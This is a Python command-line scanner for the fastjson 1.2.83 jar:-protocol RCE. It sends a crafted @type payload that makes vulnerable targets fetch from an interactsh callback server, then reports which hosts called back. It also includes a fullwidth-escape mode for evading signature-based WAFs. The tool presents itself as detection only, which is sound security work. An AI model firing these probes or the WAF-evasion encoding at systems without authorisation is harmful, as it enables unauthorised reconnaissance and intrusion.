#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fastjson-oob-detector (Python 单文件版)

对 fastjson 1.2.83 `jar:` 协议 RCE（autoType 关闭、无 safeMode）进行纯带外(OOB)检测
—— 只探测、不执行任何代码。这是 detector-go 的 Python 复刻（精简版：body 直接就是
payload JSON，不做原始请求解析/注入）。

原理:
  fastjson 的 checkAutoType 会对任意 @type 值先跑一次 @JSONType 探测
  (getResourceAsStream)。当 @type 是一个 jar:http:// 的 URL 时，JVM 会在做任何
  类名校验 / loadClass 之前，先通过 HTTP 把 jar 拉下来 —— 于是这一次 OOB 请求会在
  各种 JDK/容器组合下都触发。只要我们的 interactsh 服务器收到一次带对应关联 id 的
  HTTP 请求，就说明目标存在漏洞。

  jar url `jar:http://<decIP>:<port>/<name>!/<entry>` 会被点编码进 @type
  (fastjson 内部把 `.` -> `/`)，所以 <name> 必须不含点 —— 33 字符的小写字母数字
  interactsh id 正好合适。目标发出的 HTTP 请求是 `GET /<name>`，服务器用
  -scan-everywhere 按路径关联。

依赖:
  pip install requests cryptography
  (仅 HTTP/HTTPS 代理；不支持 socks5)

用法示例:
  python fastjson_oob_detector.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/
  python fastjson_oob_detector.py scan -o http://203.0.113.10:50050 -f targets.txt -v
  python fastjson_oob_detector.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/ --ghost
  python fastjson_oob_detector.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/ -H 'Cookie: session=...'
  python fastjson_oob_detector.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/ -x 127.0.0.1:8080
  python fastjson_oob_detector.py verify -o http://203.0.113.10:50050
"""

import argparse
import base64
import json
import os
import re
import secrets
import sys
import time
from urllib.parse import urlparse

import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

# 目标可能是自签名/过期证书的主机，忽略 TLS 校验；关闭对应告警。
requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

VERSION = "1.0.0"


# --------------------------------------------------------------------------- #
# 彩色输出：非 TTY 或设置了 NO_COLOR 时自动关闭 (对应 output.go)
# --------------------------------------------------------------------------- #
def _enable_windows_ansi() -> None:
    if os.name == "nt":
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            # ENABLE_PROCESSED_OUTPUT(1) | ENABLE_VIRTUAL_TERMINAL_PROCESSING(4)
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_windows_ansi()
USE_COLOR = (os.environ.get("NO_COLOR", "") == "") and sys.stdout.isatty()


def _colorize(code: str, s: str) -> str:
    if not USE_COLOR:
        return s
    return "\x1b[" + code + "m" + s + "\x1b[0m"


def red(s: str) -> str:
    return _colorize("31", s)


def green(s: str) -> str:
    return _colorize("32;1", s)


def yellow(s: str) -> str:
    return _colorize("33", s)


def cyan(s: str) -> str:
    return _colorize("36", s)


# --------------------------------------------------------------------------- #
# 时间间隔解析：把 "8s"/"25s"/"500ms"/"1m30s" 之类解析为秒 (对应 Go DurationFlag)
# --------------------------------------------------------------------------- #
_DUR_UNITS = {"ns": 1e-9, "us": 1e-6, "µs": 1e-6, "ms": 1e-3, "s": 1.0, "m": 60.0, "h": 3600.0}
_DUR_RE = re.compile(r"(\d+(?:\.\d+)?)(ns|us|µs|ms|s|m|h)")


def parse_duration(text: str) -> float:
    s = text.strip()
    if s == "" or s == "0":
        return 0.0
    matches = _DUR_RE.findall(s)
    if matches and "".join(a + b for a, b in matches) == s:
        return sum(float(val) * _DUR_UNITS[unit] for val, unit in matches)
    try:  # 允许纯数字，按秒处理
        return float(s)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid duration: {text!r}")


# --------------------------------------------------------------------------- #
# 随机小写字母数字串 (对应 interactsh.go randAlnum)
# --------------------------------------------------------------------------- #
_ALNUM = "abcdefghijklmnopqrstuvwxyz0123456789"


def rand_alnum(n: int) -> str:
    # 小写很重要：服务器在匹配前会把 seen id 小写化，我们也用小写 key 轮询。
    return "".join(secrets.choice(_ALNUM) for _ in range(n))


# 必须与服务器默认值一致 (pkg/settings): id 20 + nonce 13 = 33。
CORRELATION_ID_LEN = 20
NONCE_LEN = 13


# --------------------------------------------------------------------------- #
# interactsh 客户端 (对应 interactsh.go)
# --------------------------------------------------------------------------- #
class InteractshError(Exception):
    pass


class InteractshClient:
    """精简版 interactsh 客户端：注册、轮询、解密 HTTP 交互。

    只做基于路径的关联 (服务器以 -scan-everywhere 跑在裸 IP 上，无域名)：关联 id
    位于请求路径里而非子域名。NewName() 生成 `<correlationID><nonce>` (33 位小写
    字母数字) 放入路径。
    """

    def __init__(self, oob_url: str, timeout: float):
        u = urlparse(oob_url)
        if not u.scheme or not u.netloc:
            raise InteractshError(f"invalid oob url {oob_url!r}")
        self.base = f"{u.scheme}://{u.netloc}"
        self.corr_id = rand_alnum(CORRELATION_ID_LEN)  # 20 位，轮询 key
        self.secret = rand_alnum(32)
        self.priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.timeout = timeout
        self.session = requests.Session()  # 与目标流量分开，不走代理

    def new_name(self) -> str:
        """返回 `<correlationID><fresh-nonce>` —— 33 字符 token，嵌入 payload 路径。

        每次调用共享 corr_id (一次轮询覆盖全部)，但 nonce 不同，便于把每个交互映射
        回具体目标。"""
        return self.corr_id + rand_alnum(NONCE_LEN)

    def _encode_public_key(self) -> str:
        # 服务器给 PEM 块起名 "RSA PUBLIC KEY"，但里面存的是 PKIX(SubjectPublicKeyInfo) 字节。
        der = self.priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
        b64 = base64.b64encode(der).decode("ascii")
        lines = [b64[i : i + 64] for i in range(0, len(b64), 64)]
        pem = "-----BEGIN RSA PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END RSA PUBLIC KEY-----\n"
        return base64.b64encode(pem.encode("ascii")).decode("ascii")

    def register(self) -> None:
        body = {
            "public-key": self._encode_public_key(),
            "secret-key": self.secret,
            "correlation-id": self.corr_id,
        }
        resp = self.session.post(
            self.base + "/register", json=body, timeout=self.timeout,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code != 200:
            raise InteractshError(f"register failed: {resp.status_code}: {resp.text.strip()}")
        try:
            msg = resp.json().get("message")
        except ValueError:
            msg = None
        if msg != "registration successful":
            raise InteractshError(f"unexpected register response: {resp.text.strip()}")

    def poll(self):
        url = f"{self.base}/poll?id={self.corr_id}&secret={self.secret}"
        resp = self.session.get(url, timeout=self.timeout)
        if resp.status_code != 200:
            raise InteractshError(f"poll failed: {resp.status_code}: {resp.text.strip()}")
        try:
            pr = resp.json()
        except ValueError as e:
            raise InteractshError(f"decode poll response: {e}")

        out = []
        aes_key = pr.get("aes_key") or ""
        for d in pr.get("data") or []:
            try:
                plain = self._decrypt(aes_key, d)
            except Exception:
                continue  # 单条坏数据不应拖垮整批
            try:
                it = json.loads(plain.strip())
            except (ValueError, UnicodeDecodeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        # extra / tlddata 是明文 JSON
        for s in (pr.get("extra") or []) + (pr.get("tlddata") or []):
            if not s:
                continue
            try:
                it = json.loads(s)
            except (ValueError, TypeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        return out

    def deregister(self) -> None:
        body = {"correlation-id": self.corr_id, "secret-key": self.secret}
        try:
            self.session.post(
                self.base + "/deregister", json=body, timeout=self.timeout,
                headers={"Content-Type": "application/json"},
            )
        except requests.RequestException:
            pass

    def _decrypt(self, aes_key_b64: str, msg_b64: str) -> bytes:
        # 逆向服务器的 AES-256-CTR-over-RSA-OAEP(SHA256) 方案：
        # RSA-OAEP(SHA256) 解出 AES key，再用 AES-CTR (IV = 首个 block) 解密。
        wrapped = base64.b64decode(aes_key_b64)
        key = self.priv.decrypt(
            wrapped,
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
        )
        ct = base64.b64decode(msg_b64)
        if len(ct) < 16:
            raise ValueError("ciphertext too short")
        iv, data = ct[:16], ct[16:]
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        dec = cipher.decryptor()
        return dec.update(data) + dec.finalize()


# --------------------------------------------------------------------------- #
# Ghost Bits：用全角字符做 \u 编码来绕过签名 WAF (对应 ghost.go)
# --------------------------------------------------------------------------- #
def ghost_hex_digit(n: int) -> str:
    # 把一个 nibble 映射到 Character.digit(.,16) 能解析回它的非 ASCII 字形：
    # 全角数字 ０-９ (U+FF10) 表示 0-9，全角字母 ａ-ｆ (U+FF41) 表示 10-15。
    if n < 10:
        return chr(0xFF10 + n)
    return chr(0xFF41 + (n - 10))


def ghost_escape(s: str) -> str:
    # 把每个字符编码成 \u + 四个全角十六进制字形，让 @type / jar:http 对签名 WAF
    # 不可见，而 fastjson 仍能解回原始 ASCII。仅绕过签名匹配，绕不过 safeMode。
    out = []
    for ch in s:
        code = ord(ch)
        out.append("\\u")
        for shift in (12, 8, 4, 0):
            out.append(ghost_hex_digit((code >> shift) & 0xF))
    return "".join(out)


# --------------------------------------------------------------------------- #
# payload 构造 (对应 scan.go buildAtType / decimalHostPort)
# --------------------------------------------------------------------------- #
def build_at_type(dec_ip: str, port: str, name: str, entry: str) -> str:
    """渲染 fastjson @type：把 `jar:http://host:port/name!/entry` 做点编码。"""
    slash = f"jar:http://{dec_ip}:{port}/{name}!/{entry}"
    return slash.replace("/", ".")


def build_body(at_type: str, ghost: bool) -> bytes:
    """构造要发送的 JSON body：直接就是 payload —— `{"@type":"<at_type>","x":1}`。
    ghost 模式下 key 与 @type 值都用 \\u 全角编码。"""
    if ghost:
        key = ghost_escape("@type")
        val = ghost_escape(at_type)
    else:
        key = "@type"
        val = at_type
    return ('{"' + key + '":"' + val + '","x":1}').encode("utf-8")


def decimal_host_port(base: str):
    """把 http://1.2.3.4:8000 变成 ("16909060","8000")。host 必须是 IPv4 (或已是
    十进制)；带点/带字母的 host 会破坏 jar 技巧，因为 fastjson 把 '.' 替换成 '/'。"""
    b = base
    for pre in ("http://", "https://"):
        if b.startswith(pre):
            b = b[len(pre):]
            break
    if ":" not in b:
        raise ValueError(f"oob host must be host:port: {base!r}")
    host, port = b.rsplit(":", 1)
    if host.isdigit():
        return host, port  # 已是十进制
    import ipaddress

    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        raise ValueError(f"not an IPv4 address: {host}")
    if ip.version != 4:
        raise ValueError(f"not an IPv4 address: {host}")
    return str(int(ip)), port


def parse_proxy(s: str):
    """把代理字符串规范化。裸 host:port (如 Burp 监听) 默认 http；显式 http/https
    透传。返回 (scheme, host, normalized_url)。"""
    if "://" not in s:
        s = "http://" + s
    u = urlparse(s)
    if not u.hostname:
        raise ValueError(f"proxy has no host: {s!r}")
    return u.scheme, u.netloc, f"{u.scheme}://{u.netloc}"


# --------------------------------------------------------------------------- #
# 小工具
# --------------------------------------------------------------------------- #
def clip(s: str, n: int) -> str:
    if len(s) <= n:
        return s
    return s[:n] + "…"


def first_line(s: str) -> str:
    for i, ch in enumerate(s):
        if ch in "\r\n":
            return s[:i]
    return s


def load_targets(single, file):
    out = list(single or [])
    if file:
        with open(file, "r", encoding="utf-8") as f:
            for ln in f.read().split("\n"):
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    out.append(ln)
    return out


def parse_headers(items):
    """把重复的 `-H "Name: Value"` 解析为 dict —— 用于携带 Cookie/Authorization 等头，
    扫描鉴权后的服务。冒号后一个前导空格按 curl 惯例去掉，值内部空格保留。"""
    headers = {}
    for raw in items or []:
        name, sep, value = raw.partition(":")
        name = name.strip()
        if not sep or not name:
            raise ValueError(f"invalid header (want 'Name: Value'): {raw!r}")
        headers[name] = value.lstrip()
    return headers


# --------------------------------------------------------------------------- #
# 探针发送与扫描主流程 (对应 scan.go sendReq / runScan)
# --------------------------------------------------------------------------- #
def send_req(session, url, body, headers, timeout, proxies, verbose):
    """向目标 POST 携带 payload 的 JSON body。响应无关紧要 —— OOB 回连才是信号。
    headers 里可带 Cookie/Authorization 等，用于扫描鉴权后的服务。"""
    hdrs = {"Content-Type": "application/json"}
    hdrs.update(headers or {})  # 用户自定义头覆盖默认（含 Content-Type）
    try:
        session.post(
            url, data=body, headers=hdrs,
            timeout=timeout, proxies=proxies, verify=False, allow_redirects=False,
        )
    except requests.RequestException as e:
        if verbose:
            print(f"{yellow('[!]')} send {url}: {e}")


def run_scan(cfg) -> int:
    c = InteractshClient(cfg["oob"], cfg["timeout"])
    try:
        dec_ip, port = decimal_host_port(c.base)
    except ValueError as e:
        raise SystemExit(
            f"{red('error:')} oob host must be an IPv4 (jar: trick needs a dot-free host): {e}"
        )

    c.register()
    print(
        f"{cyan('[*]')} registered with {c.base}  "
        f"(correlationID={c.corr_id}, oob={dec_ip}:{port})"
    )
    try:
        # 目标流量：忽略 TLS 校验，可选走代理。OOB 注册/轮询走 c.session，不受代理影响。
        proxies = None
        if cfg["proxy"]:
            scheme, netloc, norm = parse_proxy(cfg["proxy"])
            proxies = {"http": norm, "https": norm}
            print(f"{cyan('[*]')} target traffic via proxy {norm}")
        target_session = requests.Session()

        tasks = {}   # name -> 目标 URL
        labels = []
        for tgt in cfg["targets"]:
            name = c.new_name()
            at_type = build_at_type(dec_ip, port, name, cfg["entry"])
            body = build_body(at_type, cfg["ghost"])
            tasks[name] = tgt
            labels.append(tgt)
            if cfg["verbose"]:
                print(f"{cyan('[>]')} {tgt}  @type={at_type}")
                print(f"    body: {clip(body.decode('utf-8', 'replace'), 240)}")
            send_req(target_session, tgt, body, cfg["headers"], cfg["timeout"], proxies, cfg["verbose"])
        print(
            f"{cyan('[*]')} sent {len(labels)} probe(s); polling "
            f"{_fmt_dur(cfg['wait'])} for callbacks..."
        )

        # 在 wait 窗口内轮询，命中即报。
        confirmed = {}
        deadline = time.monotonic() + cfg["wait"]
        while True:
            try:
                its = c.poll()
            except InteractshError as e:
                its = []
                if cfg["verbose"]:
                    print(f"{yellow('[!]')} poll: {e}")
            for it in its:
                uid = str(it.get("unique-id", ""))
                label = tasks.get(uid.lower())
                if label is None or confirmed.get(uid):
                    continue
                confirmed[uid] = True
                print(f"\n{green('[+] VULNERABLE')} {label}")
                print(f"    via {it.get('protocol')} callback from {it.get('remote-address')}")
                line = first_line(it.get("raw-request", "") or "")
                if line:
                    print(f"    request: {line}")
            if time.monotonic() > deadline:
                break
            time.sleep(cfg["interval"])

        # 汇总。
        vuln = {}
        for uid in confirmed:
            vuln[tasks[uid]] = True
        print(f"\n{cyan('[*]')} done: {len(vuln)}/{len(labels)} probe(s) vulnerable")
        for label in labels:
            if vuln.get(label):
                print(f"    {green('VULNERABLE')}  {label}")
            else:
                print(f"    no callback  {label}")
        return len(vuln)
    finally:
        c.deregister()


def verify_oob(c: InteractshClient, wait: float, interval: float):
    """注册一个回连路径，发出漏洞目标会发的那个 HTTP GET，然后轮询直到关联匹配 (或
    窗口耗尽)。verify 命令与 live 测试共用。"""
    name = c.new_name()
    try:
        requests.get(c.base + "/" + name, timeout=c.timeout)
    except requests.RequestException as e:
        raise InteractshError(f"simulated callback GET: {e}")

    deadline = time.monotonic() + wait
    while True:
        try:
            its = c.poll()
        except InteractshError:
            its = []
        for it in its:
            if str(it.get("unique-id", "")).lower() == name.lower():
                return it
        if time.monotonic() > deadline:
            raise InteractshError(f"no matching interaction within {_fmt_dur(wait)}")
        time.sleep(interval)


def _fmt_dur(seconds: float) -> str:
    if seconds == int(seconds):
        return f"{int(seconds)}s"
    return f"{seconds}s"


# --------------------------------------------------------------------------- #
# 命令实现
# --------------------------------------------------------------------------- #
def cmd_scan(args) -> int:
    targets = load_targets(args.target, args.file)
    if not targets:
        print(f"{red('error:')} no targets: pass --target/-t or --file/-f", file=sys.stderr)
        return 1
    try:
        headers = parse_headers(args.header)
    except ValueError as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 1
    cfg = {
        "oob": args.oob,
        "targets": targets,
        "headers": headers,
        "proxy": args.proxy,
        "ghost": args.ghost,
        "entry": args.entry,
        "timeout": args.timeout,
        "wait": args.wait,
        "interval": args.interval,
        "verbose": args.verbose,
    }
    try:
        vuln = run_scan(cfg)
    except InteractshError as e:
        print(f"{red('error:')} interactsh: {e}", file=sys.stderr)
        return 1
    except (OSError, ValueError) as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 1
    return 1 if vuln > 0 else 0  # 有命中则非零，便于 CI/脚本标记


def cmd_verify(args) -> int:
    try:
        c = InteractshClient(args.oob, args.timeout)
        c.register()
    except InteractshError as e:
        print(f"{red('error:')} interactsh register: {e}", file=sys.stderr)
        return 1
    print(f"{cyan('[*]')} registered with {c.base}  (correlationID={c.corr_id})")
    try:
        it = verify_oob(c, args.wait, args.interval)
    except InteractshError as e:
        print(f"{red('[-] OOB server did NOT relay the callback:')} {e}", file=sys.stderr)
        return 1
    finally:
        c.deregister()
    print(f"{green('[+] OK:')} OOB server works end-to-end")
    print(f"    via {it.get('protocol')} callback from {it.get('remote-address')}")
    print(f"    request: {first_line(it.get('raw-request', '') or '')}")
    return 0


# --------------------------------------------------------------------------- #
# CLI (对应 main.go / scan.go / verify.go 的 flag 定义)
# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="fastjson-oob-detector",
        description="out-of-band detector for the fastjson 1.2.83 jar:-protocol RCE "
                    "(detect only, no exploitation)",
    )
    parser.add_argument("--version", action="version", version=f"fastjson-oob-detector {VERSION}")
    sub = parser.add_subparsers(dest="command", required=True)

    env_oob = os.environ.get("OOB_URL")

    p = sub.add_parser("scan", aliases=["s"],
                       help="probe targets out-of-band and report which are vulnerable")
    p.add_argument("-o", "--oob", default=env_oob, required=env_oob is None,
                   help="interactsh OOB base URL (must be IPv4, no domain), "
                        "e.g. http://203.0.113.10:50050 (env OOB_URL)")
    p.add_argument("-t", "--target", action="append", default=[],
                   help="full target URL to test, incl. path (repeatable)")
    p.add_argument("-f", "--file", help="FILE with one target URL per line")
    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra request header, curl-style (repeatable); e.g. -H 'Cookie: a=b' "
                        "-H 'Authorization: Bearer ...' to scan auth'd services")
    p.add_argument("-x", "--proxy",
                   help="route target requests through a PROXY (http/https, e.g. http://127.0.0.1:8080)")
    p.add_argument("--ghost", action="store_true",
                   help="Ghost-Bits: \\u-encode @type/jar with fullwidth digits to evade signature WAFs")
    p.add_argument("--entry", default="POC", help="jar entry base NAME (cosmetic; not sent over HTTP)")
    p.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                   help="per-request HTTP timeout; duration string e.g. 8s / 500ms / 1m30s "
                        "(bare number = seconds) (default 8s)")
    p.add_argument("--wait", type=parse_duration, default="10s", metavar="DURATION",
                   help="how long to poll for OOB callbacks after sending; e.g. 10s / 1m (default 10s)")
    p.add_argument("--interval", type=parse_duration, default="2s", metavar="DURATION",
                   help="poll interval; e.g. 2s / 500ms (default 2s)")
    p.add_argument("-v", "--verbose", action="store_true", help="print each payload and poll errors")
    p.set_defaults(func=cmd_scan)

    v = sub.add_parser("verify", aliases=["v"],
                       help="sanity-check the OOB server: register, self-trigger, confirm decrypt")
    v.add_argument("-o", "--oob", default=env_oob, required=env_oob is None,
                   help="interactsh OOB base URL (must be IPv4, no domain) (env OOB_URL)")
    v.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                   help="per-request HTTP timeout; duration string e.g. 8s / 500ms / 1m30s "
                        "(bare number = seconds) (default 8s)")
    v.add_argument("--wait", type=parse_duration, default="20s", metavar="DURATION",
                   help="how long to wait for the callback; e.g. 20s / 1m (default 20s)")
    v.add_argument("--interval", type=parse_duration, default="2s", metavar="DURATION",
                   help="poll interval; e.g. 2s / 500ms (default 2s)")
    v.set_defaults(func=cmd_verify)

    return parser


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
